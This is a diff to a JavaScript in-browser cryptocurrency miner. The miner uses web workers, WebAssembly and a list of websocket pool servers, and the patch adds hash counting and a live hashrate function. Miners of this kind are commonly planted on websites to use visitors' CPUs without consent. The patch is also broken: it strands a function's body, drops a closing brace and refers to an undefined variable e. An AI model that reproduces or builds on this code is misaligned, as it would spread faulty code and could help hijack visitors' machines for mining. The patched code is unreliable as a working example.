@@ -1,4 +1,15 @@
-var server = "wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
+var server = "wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/";
+var job = null;
+var workers = [];
+var ws;
+var receiveStack = [];
+var sendStack = [];
+var totalhashes = 0;
+var connected = 0;
+var reconnector = 0;
+var attempts = 1;
+var throttleMiner = 0;
+var handshake = null;
     try {
         if ("object" === typeof WebAssembly && "function" === typeof WebAssembly.instantiate) {
             var c = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
@@ -727,7 +738,11 @@ function addWorker() {
     c.onmessage = on_workermsg;
     setTimeout(function() {
         informWorker(c)
-    }, 2E3)
+
+, 2E3)
+    if (e.data && e.data.hashes) {
+    totalhashes += e.data.hashes;
+    }
 }
 function removeWorker() {
     1 > workers.length || workers.shift().terminate()
@@ -770,3 +785,25 @@ function on_workermsg(c) {
     }
 }
 ;
+// =====================================
+// LIVE HASHRATE CALCULATION FUNCTION
+// =====================================
+function getHashesPerSecond() {
+    var now = Date.now();
+
+    if (!getHashesPerSecond.lastTime) {
+        getHashesPerSecond.lastTime = now;
+        getHashesPerSecond.lastHashes = totalhashes;
+        return 0;
+    }
+
+    var elapsed = (now - getHashesPerSecond.lastTime) / 1000;
+    if (elapsed <= 0) return 0;
+
+    var hashes = totalhashes - getHashesPerSecond.lastHashes;
+
+    getHashesPerSecond.lastTime = now;
+    getHashesPerSecond.lastHashes = totalhashes;
+
+    return hashes / elapsed;
+}
